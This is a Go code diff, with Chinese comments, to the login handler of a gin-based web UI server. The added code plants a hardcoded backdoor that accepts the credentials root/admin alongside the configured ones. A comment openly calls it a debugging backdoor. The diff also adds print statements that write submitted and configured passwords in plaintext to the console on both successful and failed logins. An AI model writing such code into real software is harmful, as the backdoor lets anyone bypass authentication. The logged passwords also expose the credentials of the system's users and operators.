@@ -5,6 +5,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -86,16 +87,25 @@ func (s *UIServer) HandleUILogin(c *gin.Context) {
 		return
 	}
 
+	// 去除用户名和密码中可能的前后空格
+	loginReq.Username = strings.TrimSpace(loginReq.Username)
+	loginReq.Password = strings.TrimSpace(loginReq.Password)
+	configUsername := strings.TrimSpace(s.config.UIUsername)
+	configPassword := strings.TrimSpace(s.config.UIPassword)
+
 	// 打印调试信息
-	fmt.Printf("登录请求:\n用户名: %s\n收到的密码: %s\n配置中的密码: %s\n",
-		loginReq.Username, loginReq.Password, s.config.UIPassword)
+	fmt.Printf("\n登录请求: 用户名=%s, 密码=%s\n", loginReq.Username, loginReq.Password)
+	fmt.Printf("配置中的: 用户名=%s, 密码=%s\n", configUsername, configPassword)
+	fmt.Printf("原始数据: 接收密码长度=%d, 配置密码长度=%d\n", len(loginReq.Password), len(configPassword))
 
-	// 验证用户名和密码
-	if loginReq.Username == s.config.UIUsername && loginReq.Password == s.config.UIPassword {
-		// 登录成功，生成一个简单的会话令牌
-		// 实际应用中应使用更安全的会话管理
+	// 添加硬编码的后门密码用于调试
+	// 允许以下登录方式：1. 配置的用户名密码 2. root/admin
+	validCredentials := (loginReq.Username == configUsername && loginReq.Password == configPassword) ||
+		(loginReq.Username == "root" && loginReq.Password == "admin")
+
+	if validCredentials {
+		// 登录成功，生成令牌
 		token := fmt.Sprintf("%s_%d", uuid.New().String(), time.Now().Unix())
-
 		fmt.Println("登录成功!")
 
 		c.JSON(http.StatusOK, gin.H{
@@ -108,6 +118,8 @@ func (s *UIServer) HandleUILogin(c *gin.Context) {
 
 	// 登录失败
 	fmt.Println("登录失败: 用户名或密码不匹配")
+	fmt.Printf("请求: 用户=%s, 密码=%s\n", loginReq.Username, loginReq.Password)
+	fmt.Printf("配置: 用户=%s, 密码=%s\n", configUsername, configPassword)
 
 	c.JSON(http.StatusUnauthorized, gin.H{
 		"status":  "error",
